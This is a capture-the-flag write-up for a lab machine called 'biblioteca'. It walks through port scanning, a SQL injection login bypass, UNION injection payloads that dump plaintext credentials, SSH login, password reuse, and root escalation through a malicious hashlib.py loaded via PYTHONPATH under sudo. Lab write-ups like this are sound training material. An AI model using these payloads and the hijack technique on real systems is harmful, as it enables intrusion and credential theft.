# biblioteca

## Recon
```bash
silent-scan $TARGET
nmap -sVC -p22,8000 $TARGET -oN service
```

**Output**
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fc:4a:e1:2e:b0:df:f2:da:ce:aa:97:d2:99:77:28:73 (RSA)
|   256 9f:e3:d2:2f:02:73:20:64:ae:4a:ac:69:e3:65:cf:52 (ECDSA)
|_  256 f2:24:fd:c2:af:f6:8f:55:9d:60:c3:be:02:7a:88:25 (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
___

## Enumeration

### Fuzzing with Feroxbuster
```bash
feroxbuster -u http://$TARGET:8000 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --status-codes 200 301
```

### We see a login page, we register but nothing appears

### We try In-Band SQL injection on the login page
```
user:admin' or '1'='1'#
password:123456
```
**Output**
```
Hi smokey!!
Welcome to the index page... 
```

### We have a potential user (`smokey`)

### We notice a cookie where some parts are base64 encoded
```bash
# Payload
echo "ahQudg" | base64 -d
# Header
echo "eyJpZCI6MSwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoic21va2V5In0" | base64 -d
```

**Output**
```
# Payload
j.v
# Header
{"id":1,"loggedin":true,"username":"smokey"}
```

### Let's try UNION SQL injection
```bash
# Enumerate tables 
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
# Enumerate columns from the users table
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
# Dump the info from the users table
' UNION SELECT 1,group_concat(username,':',password),3,4 FROM users-- -
```

**Output**
```
 Hi smokey:My_P@ssW0rd123,niko:123456,admin:admin!!
```

### We found a password!
```bash
ssh smokey@$TARGET
# password: My_P@ssW0rd123
```
### We have access to the host 
___

## Privesc

### App enumeration
```bash
sudo -l
cat /var/opt/app/app.py
```
**Output**
```
app.secret_key = '$uperS3cr3tK3y'
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'smokey'
app.config['MYSQL_PASSWORD'] = '$tr0nG_P@sS!'
app.config['MYSQL_DB'] = 'website'
```

### File enumeration
```bash
find / -type f -name "*.txt" 2>/dev/null
```
### Lateral movement to hazel
```bash
su hazel
# password: hazel
```

### We have access as hazel since the user reused their username as the password 

```bash
cat /home/hazel/user.txt
sudo -l
cat hasher.py
```
**Output**
```
User hazel may run the following commands on ip-10-129-146-148:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py

import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():                                                                                 
    passw = input("Enter a password to hash: ")                                             
    hashing(passw)                                                                          
                                                                                            
if __name__ == "__main__":                                                                  
    main() 
```
### We can escalate privileges using Python Library Hijacking via PYTHONPATH
```bash
# Create the malicious module in /tmp
cat > /tmp/hashlib.py << 'EOF'
import os
os.system("/bin/bash")
EOF

# Execute from /tmp using PYTHONPATH
cd /tmp
sudo PYTHONPATH=. /usr/bin/python3 /home/hazel/hasher.py
```
### Root Flag
```bash
cat /root/root.txt
```

---

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [in-band](../../../exploits/web-disclosure/sql-union-injection.md)
- [python-library-hijack](../../../privesc/linux/python-library-hijack.md)